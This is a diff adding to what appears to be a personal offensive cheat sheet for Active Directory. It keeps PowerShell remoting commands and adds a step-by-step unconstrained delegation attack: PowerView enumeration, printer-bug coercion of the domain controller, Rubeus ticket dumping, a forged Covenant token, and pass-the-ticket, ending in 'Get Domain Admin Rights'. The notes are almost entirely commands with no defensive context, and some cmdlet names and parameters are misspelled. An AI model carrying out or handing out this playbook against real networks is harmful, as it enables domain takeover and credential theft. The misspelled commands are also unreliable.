@@ -166,3 +166,28 @@ shell
 PowerShell-Remoting 
 Enter-PSSession -ComputerName <computername> -Credentials <domain>\username
 Invoke-Commands -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Unconstrained delegation
+
+Import powerview;
+
+1) get-netcomputer -unconstrained -properties dnshostname
+   ms-rprn.exe \\DC \\Workstation
+   rubeus.exe dump /service:krbtgt //looking for DC ticket; 
+   Copy DC Base64 encoded krbtgt;
+   Make fake token (Covenant): maketoken administrator <username> <junk password>
+   rubeus.exe ptt /ticket:<Base64 encoded ticket>
+   Get Domain Admin Rights.
+   
+
+
+
+
+
+
+
+
+
+
+
+
